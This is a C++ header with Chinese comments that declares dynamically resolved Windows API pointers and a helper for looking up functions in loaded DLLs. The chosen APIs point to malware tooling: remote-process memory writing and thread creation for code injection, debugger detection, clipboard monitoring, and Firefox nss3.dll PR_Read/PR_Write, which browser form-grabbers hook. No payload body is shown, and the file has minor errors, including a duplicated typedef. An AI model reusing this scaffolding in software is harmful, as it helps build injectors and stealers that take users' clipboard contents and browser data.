#pragma once
#include <Windows.h>
#include <tlhelp32.h>
#include <string>
#include "utils.h"

// kernel32.dll 的函數
typedef BOOL(WINAPI* IsDebuggerPresent_t)();
typedef DWORD(WINAPI* GetLastError_t)();
typedef DWORD(WINAPI* GetCurrentProcessId_t)();
typedef std::vector<DWORD>(WINAPI* GetProcessIDByName_t)(const std::wstring& processName);
// 記憶體操作
typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
// process & thread
typedef HANDLE(WINAPI* OpenProcess_t)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef FARPROC(WINAPI* GetProcAddress_t)(HMODULE hModule, LPCSTR lpProcName);
typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
typedef VOID(WINAPI* Sleep_t)(DWORD dwMilliseconds);
// handle & module
typedef BOOL(WINAPI* CloseHandle_t)(HANDLE hObject);
typedef HMODULE(WINAPI* GetModuleHandleA_t)(LPCSTR lpModuleName);
typedef HMODULE(WINAPI* GetModuleHandleW_t)(LPCWSTR lpModuleName);
typedef BOOL(WINAPI* GetModuleHandleExW_t)(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE* phModule);
typedef DWORD(WINAPI* GetModuleFileNameA_t)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// 字串處理
typedef int (WINAPI* WideCharToMultiByte_t)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
typedef int (WINAPI* MultiByteToWideChar_t)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// toolhelp32.h
typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL(WINAPI* Process32First_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL(WINAPI* Process32Next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

// user32.dll
typedef ATOM(WINAPI* RegisterClassEx_t)(const WNDCLASSEX* lpwcx);
typedef HWND(WINAPI* CreateWindow_t)(LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);typedef BOOL(WINAPI* AddClipboardFormatListener_t)(HWND hwnd);
typedef BOOL(WINAPI* GetMessage_t)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
typedef BOOL(WINAPI* TranslateMessage_t)(const MSG* lpMsg);
typedef LRESULT(WINAPI* DispatchMessage_t)(const MSG* lpMsg);
typedef LRESULT(WINAPI* DefWindowProcW_t)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
typedef BOOL(WINAPI* OpenClipboard_t)(HWND hWnd);
typedef HANDLE(WINAPI* GetClipboardData_t)(UINT uFormat);
typedef BOOL(WINAPI* AddClipboardFormatListener_t)(HWND hwnd);
typedef LPVOID(WINAPI* GlobalLock_t)(HGLOBAL hMem);
typedef BOOL(WINAPI* GlobalUnlock_t)(HGLOBAL hMem);
typedef BOOL(WINAPI* CloseClipboard_t)();

// firefox nss3.dll 的函數
typedef int (*PR_Read_t)(void* fd, void* buf, int amount);
typedef int (*PR_Write_t)(void* fd, char* buf, int amount);


template<typename function_t>
function_t GetProcFromDll(HINSTANCE &hdLL, std::string proc, std::string dll)
{
    hdLL = GetModuleHandleW(toUTF16(dll).data());
    if (hdLL == NULL) {
        DWORD error = GetLastError();
        Log("log.txt", "[-] Get " + dll + " handle failed, error=" + std::to_string(error) + ".\n");
        return nullptr;
    }

    function_t fpFunc = reinterpret_cast<function_t>(GetProcAddress(hdLL, proc.data()));
    if (fpFunc == NULL) {
        DWORD error = GetLastError();
        Log("log.txt", "[-] Get " + proc + "() from " + dll + " failed, error=" + std::to_string(error) + ".\n");
        FreeLibrary(hdLL);
        return nullptr;
    }
    return fpFunc;
}
